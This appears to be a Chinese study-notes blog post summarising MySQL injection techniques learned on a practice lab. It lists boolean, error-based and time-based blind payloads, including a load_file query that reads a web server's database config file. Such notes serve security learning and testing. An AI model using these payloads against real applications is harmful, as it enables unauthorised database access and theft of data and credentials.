## 记一次环境测试并总结下sql注入
### 前言
最近帮老板测试了下他的sql注入联系环境，刚好我也想看看《mysql-injection》,这本sql注入天书，然后总结下写点东西。
### 开始
一般的什么get、post、单引号之类的测试这里就不一一累述了，主要想记录总结下一些开始没怎么学懂的东西。

##### 基于布尔sql盲注

	1.left(database(),1)>\'s\'
>left(a,b)从左侧截取a的前b位
>
	2.(ascii(substr((select flag from flag),1,1)))>100 --+
>substr(a,b,c)从c位置开始，截取字符串a的c长度
>ascii()将某个字符转换为ascii值

	3.ord(mid((select ifnull(cast(username as char),0x20) from security.user order by id limit 0,1),1,1))>98%23
>mid(a,b,c)从位置b开始，截取a字符串的c位
>ord()函数同ascii()，将字符转为ascii值
>cast(a as b)将a转换为b类型
>ifnull(a,b)a不是null就取a，是就取b

	4.select user() regexp \'^[a-z]\';
>正则表达式的用法,user()结果为root,regexp为匹配root的正则表达式。匹配正确为1，不正确为0。

	5.select user() like \'ro%\'
>有则1，没有则0

##### 基于报错的sql盲注——构造payload让信息通过错误提示回显出来
1.

	select 1,count(*),concat(0x3a,0X3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from infomation_schema.columns group by a;
>一是concat计数，二是floor，取得0 or 1，进行数据重复，三是group by进行分组，原理好像
[http://www.cnblogs.com/xdans/p/5412468.html](http://www.cnblogs.com/xdans/p/5412468.html)这是一个好文，还有以下变形

	select count(*) from information_schema.tables froup by concat(version(),floor(rand(0)*2)) 
>如果关键点表被禁用了可以使用用户变量来报错

	select min(@a=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
2.

	select exp(~(select * from (select user())a))
>double数值类型超出范围
>exp()为以e的底的对数函数:版本在5.5.5及其以上

3.

	select !(select * from (select user())x) - ~0
>bigint 超出范围：~0是对0逐位取反，版本在5.5.5及其以上

4.

	extractvalue(1,concat(0x7e,(select @@version),0x7e)) se
>mysql对xml数据进行查询和修改的xpath函数，xpath语法错误

5.

	updatexml(1,concat(0x7e,(select @@version),0x7e),1)
>mysql对xml数据进行查询和修改的xpath函数，xpath语法错误

6.

	select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
>mysql重复特征，此处重复了version，所以报错。

#####基于时间的sql盲注
	1.if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1)))>10,sleep(1),NULL)%23

>if(a,b,c) a假则执行b

	2.if(ascii(substring((SELECT flag FROM flag),1,1))=119,(select benchmark(10000000,md5(0x41))),1)%23

>benchmark(a,b)执行b命令a次，算一种ddos推荐sleep

#####load_file()和into outfile()
1.load_file()导出文件

	select 1,user(),load_file(\'/var/www/html/db.php\')

load_file(file_name):读取文件并返回该文件的内容作为一个字符串。

使用条件：

- 必须有读取权限且文件必须完全可读
- 欲读文件必须在服务器上
- 必须指定文件完整路径(有些课报错爆出绝对路径)
- 欲读取文件必须小于max_allowed_packet


>可用char()编码后的代替
>
>或者直接16进制
>
>/用\\\\代替（win）

2.文件导入到数据库
3.导入到文件
select...into outfile \'filename\'
##### 万能密码就不细说了
注入方式和get型差不多

手法和前文说的一样注入点不同而已
##### 多语句
能多语句就随便搞嘛
##### http头注入 
前提是数据库对头信息进行了提取并处理

常见位置：

- user-agent
- cookie
- referer



工具：

- live http headers(firefox)

- tamper data(firefox)

手法和前文说的一样注入点不同而已

##### waf绕过
后面将新开一篇记录，在此就不累述了。

### 后记
这次记录了很多注入的手法，有常见的也有不怎么常见的，主要是很早就想好好地记录总结下sql了，借此机会就成热打铁写了这篇文章，其中借鉴不少天书的记录，后面会针对wafbypass做些收集并整理出来。